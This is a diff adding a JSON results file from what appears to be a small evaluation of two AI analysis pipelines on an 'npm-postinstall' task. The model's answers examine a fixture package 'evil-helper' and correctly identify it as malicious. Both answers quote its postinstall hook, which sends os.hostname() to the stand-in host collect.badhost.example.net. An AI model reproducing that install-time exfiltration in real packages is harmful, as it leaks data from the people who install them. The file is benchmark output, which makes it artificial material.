@@ -1,0 +1,62 @@
+{
+  "at": "2026-10-25T22:35:03.939Z",
+  "model": "haiku",
+  "reps": 1,
+  "capUsd": 0.5,
+  "spentUsd": 0.0059,
+  "arms": [
+    {
+      "arm": "tier0",
+      "runs": 1,
+      "costUsd": 0.0042,
+      "correct": 4,
+      "facts": 5,
+      "verifiedFacts": 0,
+      "costPerCorrect": 0.00104,
+      "medianMs": 15876
+    },
+    {
+      "arm": "assay",
+      "runs": 1,
+      "costUsd": 0.0018,
+      "correct": 4,
+      "facts": 5,
+      "verifiedFacts": 1,
+      "costPerCorrect": 0.00044,
+      "medianMs": 13270
+    }
+  ],
+  "ratio": 0.42307692307692313,
+  "pass": true,
+  "summary": "model haiku, 1 tasks × 1: Tier 0 4/5 facts, $0.0042, 0 machine-verified; Assay 4/5 facts, $0.0018, 1 machine-verified; cost per correct fact ratio Assay/Tier0 = 0.42 (small sample, no interval)",
+  "runs": [
+    {
+      "arm": "tier0",
+      "task": "npm-postinstall",
+      "rep": 1,
+      "costUsd": 0.0041704,
+      "ms": 15876,
+      "correct": 4,
+      "facts": 5,
+      "verifiedFacts": 0,
+      "claims": 0,
+      "verified": 0,
+      "refuted": 0,
+      "answer": "**Yes.** Installing evil-helper runs code automatically, and that code sends the machine's hostname to an external server.\n\n- **Trigger:** `postinstall/evil-helper/package.json`, `scripts.postinstall` = `\"node scripts/setup.js\"`. npm runs this on install with no extra prompt.\n- **Code:** `postinstall/evil-helper/scripts/setup.js:1-3` (seen). It requires `https` and `os`, then runs `https.get(\"https://collect.badhost.example.net/i?h=\" + os.hostname())`. The only data sent is the hostname, in the query string. The response is ignored.\n- **Contact:** `collect.badhost.example.net` over HTTPS, a collection-style host name. I did not check DNS or the live server, so what it does with the data is **unknown**.\n- **Tarball:** `postinstall/evil-helper-1.0.0.tgz` contains the same `scripts/setup.js` (byte-identical to the extracted copy). Its `package.json` differs only by a trailing newline.\n- **Not contacted by the package:** `index.js` is just `module.exports = (a, b) => a + b;`. The declared dependency `tiny-fetch` is not used by any code I saw. `node_modules` is absent, so I did not run anything.\n\nI did not execute the script. Installing this package would send the hostname to that domain. Avoid installing it, or install with `--ignore-scripts` if you must inspect it first."
+    },
+    {
+      "arm": "assay",
+      "task": "npm-postinstall",
+      "rep": 1,
+      "costUsd": 0.0017556500000000003,
+      "ms": 13270,
+      "correct": 4,
+      "facts": 5,
+      "verifiedFacts": 1,
+      "claims": 2,
+      "verified": 1,
+      "refuted": 0,
+      "answer": "**Yes.** Installing evil-helper runs code, and that code contacts a host that collects the machine's hostname.\n\n- **Runs on install (seen):** `postinstall/evil-helper` declares a postinstall script, `node scripts/setup.js` (ob_2cc35b1ae96c74d4ae4a92ea5a4484cb5bf772184e67c3ab493317db8df02a73). Claim recorded as clm_01a17533e0c471d4917001f68d3eefd2.\n- **Contacts (seen):** `scripts/setup.js` makes an HTTPS GET to `https://collect.badhost.example.net/i?h=` + `os.hostname()` (ob_97329afe94277639be5a49c63f0308213cd9eae8d96be0cfe2aaddfd7668cfdb, ob_aad8ff04ba338cb6310952dd1c49aa3475b9987911c53d3caf3068b9a1e14b3b). So the machine's hostname is sent to that host. Claim recorded as clm_01a17533e53f72e788a8c0ba6786bbc5.\n- **Not seen:** the file is a single 129-byte script with no other logic, so I found nothing else it sends. I did not check what the host does with the data, or whether it returns anything.\n- **Also declared (inferred, not examined):** a dependency on `tiny-fetch@^2.1.0`, which installs with the package and I did not inspect.\n\nI'd treat this package as malicious: don't install it, and don't run `setup.js` by hand."
+    }
+  ]
+}
